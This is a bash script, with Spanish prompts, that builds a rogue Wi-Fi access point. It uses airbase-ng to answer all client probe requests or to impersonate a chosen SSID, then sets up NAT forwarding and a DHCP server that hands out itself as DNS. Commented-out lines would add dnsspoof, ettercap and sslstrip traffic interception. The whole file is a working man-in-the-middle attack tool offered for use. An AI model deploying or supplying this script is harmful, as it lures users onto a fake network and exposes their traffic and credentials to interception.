#!/bin/bash

echo "PRE-REQUISITES"
echo "=============="
echo "- External interface configured and communicating."
echo "- Wireless card connected but NOT configured."
echo "- No interfaces on the 192.168.3.0/24 network."
echo " "

LOGDIR="$(date +%F-%H%M)"
mkdir $LOGDIR
cd $LOGDIR

# get vars from user
echo 'Interfaces de red Disponibles:'
ifconfig | grep 'Link\|addr'
echo -n "Seleccione la interfaz conectada a internet, por ejemplo eth0: "
read -e IFACE
airmon-ng
echo -n "Seleccione su interfaz Inalambrica, por ejemplo wlan0: "
read -e WIFACE
#echo -n "Enter the ESSID you would like your rogue AP to be called, for example Free WiFi: "
#read -e ESSID
#echo -n "Enter the channel you would like your rogue AP to communicate on [1-11]: "
#read -e CHANNEL

# start WAP
airmon-ng start $WIFACE
#modprobe tun
#airbase-ng --essid "$ESSID" -c $CHANNEL -v $WIFACE 
echo "Seleccione el modo de operación del AP:"
echo
echo "1) Responder a todas las peticiones de Conexion"
echo "2) Responder a un ESSID en concreto"
echo "Seleccion: "
echo

read ANSWER
	if [[ $ANSWER = "1" ]] ; then
		echo
		echo "Creado AP que responda a todas las peticiones..."
		airbase-ng -c6 -P -C20 -y -v $WIFACE > airbase.log & xterm -bg black -fg yellow -T Airbase-NG -e tail -f airbase.log  &

	fi


	if [[ $ANSWER = "2" ]] ; then
		echo
		echo "Escriba el nombre de SSID a utilizar: "
		echo
		read -e SSID
		echo "Creado AP con SSID $SSID..." 
		echo
		airbase-ng  -c6 --essid "$SSID" -y -v $WIFACE > airbase.log & xterm -bg black -fg yellow -T Airbase-NG -e tail -f airbase.log  &

	fi
echo
sleep 5
echo "Configurando la interfaz $WIFACE"
ifconfig $WIFACE 192.168.3.1 netmask 255.255.255.0 up
#ifconfig $WIFACE mtu 1400
echo "1" > /proc/sys/net/ipv4/ip_forward
route add -net 192.168.3.0 netmask 255.255.255.0 gw 192.168.3.1
echo 'Configurando IPTABLES y redirigiendo el trafico'
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -j MASQUERADE
echo 'Iniciando Servidor DHCP'

# start DHCP server
echo "Creating a dhcpd.conf to assign addresses to clients that connect to us"
echo "default-lease-time 600;" > dhcpd.conf
echo "max-lease-time 720;"  >> dhcpd.conf
echo "ddns-update-style none;" >> dhcpd.conf
echo "authoritative;"  >> dhcpd.conf
echo "log-facility local7;"  >> dhcpd.conf
echo "subnet 192.168.3.0 netmask 255.255.255.0 {"  >> dhcpd.conf
echo "range 192.168.3.100 192.168.3.150;"  >> dhcpd.conf
echo "option routers 192.168.3.1;"  >> dhcpd.conf
echo "option domain-name-servers 192.168.3.1;"  >> dhcpd.conf
echo "}"  >> dhcpd.conf
echo 'Servidor DHCP levantado en la interfaz $WIFACE con direccionemiento 192.168.3.0/24'
dhcpd -q -cf dhcpd.conf -pf /var/run/dhcp3-server/dhcpd.pid $WIFACE &
echo "Visualización de Logs"
xterm -bg black -fg red -T "System Logs" -e tail -f /var/log/messages &

#echo "Iniciando DNSSPOOF"

#xterm -bg black -fg green -e dnsspoof -f '/root/hosts' -i $WIFACE &

#cho "Iniciando Ettercap"
#term -bg black -fg blue -e ettercap -p -u -T -q -l ettercap.log -i $WIFACE &

#echo "Launching SSLStrip log"
#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
#python /pentest/web/sslstrip/sslstrip.py -p &> /dev/null &
#sleep 5
#xterm -bg black -fg blue -T "SSLStrip Log" -e tail -f sslstrip.log &

echo "Done."

